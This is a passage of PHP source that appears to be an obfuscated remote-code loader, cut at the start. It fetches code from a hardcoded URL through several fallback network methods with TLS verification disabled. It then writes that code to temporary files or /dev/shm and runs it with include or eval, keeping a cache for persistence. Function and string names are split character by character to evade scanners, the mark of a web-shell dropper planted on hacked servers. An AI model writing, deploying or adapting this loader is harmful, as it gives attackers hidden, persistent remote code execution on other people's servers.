        if (abadi_fn_ok('s'.'t'.'r'.'e'.'a'.'m'.'_'.'s'.'o'.'c'.'k'.'e'.'t'.'_'.'c'.'l'.'i'.'e'.'n'.'t')) {
            $tried[] = 's'.'t'.'r'.'e'.'a'.'m'.'_'.'s'.'o'.'c'.'k'.'e'.'t'.'_'.'c'.'l'.'i'.'e'.'n'.'t';
            $target = ($ssl ? 's'.'s'.'l'.':'.'/'.'/' : '') . $host . ':' . $port;
            $fp = @stream_socket_client(
                $target,
                $errno,
                $errstr,
                30,
                STREAM_CLIENT_CONNECT,
                stream_context_create(array('s'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false)))
            );
        }
        if (!is_resource($fp) && abadi_fn_ok('f'.'s'.'o'.'c'.'k'.'o'.'p'.'e'.'n')) {
            $tried[] = 'f'.'s'.'o'.'c'.'k'.'o'.'p'.'e'.'n';
            $fp = @fsockopen(($ssl ? 's'.'s'.'l'.':'.'/'.'/' : '') . $host, $port, $errno, $errstr, 30);
        }
        if (is_resource($fp)) {
            stream_set_timeout($fp, 45);
            @fwrite($fp, $req);
            $raw = '';
            while (!feof($fp)) {
                $chunk = @fread($fp, 16384);
                if ($chunk === false || $chunk === '') break;
                $raw .= $chunk;
            }
            @fclose($fp);
            list($code, $head, $body) = abadi_parse_http($raw);
            if (abadi_ok_body($body) && ($code === 0 || ($code >= 200 && $code < 400))) {
                return array(true, $body, 's'.'o'.'c'.'k'.'e'.'t', $tried);
            }
        }
    }

    if (abadi_fn_ok('c'.'o'.'p'.'y') && abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        $tried[] = 'c'.'o'.'p'.'y';
        $base = abadi_cache_dir();
        if ($base === '' && function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
            $base = rtrim((string) @sys_get_temp_dir(), "\\/");
        }
        if ($base !== '') {
            $tmp = $base . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'f'.'e'.'t'.'c'.'h'.'_' . mt_rand(1000, 9999) . '.'.'t'.'m'.'p';
            $ctx = stream_context_create(array(
                'h'.'t'.'t'.'p' => array('h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 45, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
                's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
            ));
            if (@copy($url, $tmp, $ctx) && is_file($tmp)) {
                $b = @file_get_contents($tmp);
                @unlink($tmp);
                if (abadi_ok_body($b)) return array(true, $b, 'c'.'o'.'p'.'y', $tried);
            }
            @unlink($tmp);
        }
    }

    if (abadi_fn_ok('f'.'i'.'l'.'e')) {
        $tried[] = 'f'.'i'.'l'.'e';
        $ctx = stream_context_create(array(
            'h'.'t'.'t'.'p' => array('h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 45, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
            's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
        ));
        $lines = @file($url, FILE_IGNORE_NEW_LINES, $ctx);
        if (is_array($lines)) {
            $b = implode("\n", $lines);
            if (abadi_ok_body($b)) return array(true, $b, 'f'.'i'.'l'.'e', $tried);
        }
    }

    if (abadi_fn_ok('r'.'e'.'a'.'d'.'f'.'i'.'l'.'e')) {
        $tried[] = 'r'.'e'.'a'.'d'.'f'.'i'.'l'.'e';
        $ctx = stream_context_create(array(
            'h'.'t'.'t'.'p' => array('h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 45, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
            's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
        ));
        ob_start();
        $ok = @readfile($url, false, $ctx);
        $b = ob_get_clean();
        if ($ok !== false && abadi_ok_body($b)) return array(true, $b, 'r'.'e'.'a'.'d'.'f'.'i'.'l'.'e', $tried);
    }

    return array(false, '', '', $tried);
}

function abadi_prepare($src) {
    $src = (string) $src;
    if (substr($src, 0, 3) === "\xEF\xBB\xBF") $src = substr($src, 3);
    $src = preg_replace('/'.'^'.'\\'.'s'.'*'.'<'.'\\'.'?'.'p'.'h'.'p'.'\\'.'s'.'*'.'/'.'i', '', $src, 1);
    $src = preg_replace('/'.'^'.'\\'.'s'.'*'.'<'.'\\'.'?'.'\\'.'s'.'*'.'/'.'i', '', $src, 1);
    return $src;
}

function abadi_run($src) {
    $code = abadi_prepare($src);
    $cache = abadi_cache_file();

    // Simpan cache di /dev/shm atau /tmp (bukan webroot)
    if ($cache !== '' && abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        if (@file_put_contents($cache, "<?php\n" . $code) !== false && is_file($cache)) {
            @chmod($cache, 0600);
            include $cache;
            return true;
        }
    }

    // One-shot temp di cache dir / system temp, lalu hapus
    if (abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        $base = abadi_cache_dir();
        if ($base === '' && function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
            $base = rtrim((string) @sys_get_temp_dir(), "\\/");
        }
        if ($base !== '') {
            $php = $base . DIRECTORY_SEPARATOR . 'a'.'b'.'a'.'d'.'i'.'_' . mt_rand(100000, 999999) . '.'.'p'.'h'.'p';
            if (@file_put_contents($php, "<?php\n" . $code) !== false) {
                include $php;
                @unlink($php);
                return true;
            }
            @unlink($php);
        }
    }

    if (abadi_fn_ok('e'.'v'.'a'.'l')) {
        eval($code);
        return true;
    }

    return false;
}

$force = isset($_GET['r'.'e'.'f'.'r'.'e'.'s'.'h']) || isset($_GET['n'.'o'.'c'.'a'.'c'.'h'.'e']);
$cacheFile = abadi_cache_file();

if (!$force && ABADI_TTL > 0 && $cacheFile !== '' && is_file($cacheFile)) {
    $age = time() - (int) @filemtime($cacheFile);
    if ($age >= 0 && $age < ABADI_TTL) {
        include $cacheFile;
        exit;
    }
}

list($ok, $body, $via, $tried) = abadi_fetch(ABADI_URL);

if (!$ok || !abadi_ok_body($body)) {
    if ($cacheFile !== '' && is_file($cacheFile)) {
        include $cacheFile;
        exit;
    }
    http_response_code(502);
    exit;
}

if (!headers_sent() && isset($_GET['d'.'e'.'b'.'u'.'g'])) {
    header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'V'.'i'.'a'.':'.' ' . $via);
    header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'T'.'r'.'i'.'e'.'d'.':'.' ' . implode(',', $tried));
    if ($cacheFile !== '') header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'C'.'a'.'c'.'h'.'e'.':'.' ' . $cacheFile);
}

if (!abadi_run($body)) {
    http_response_code(500);
    exit;
}
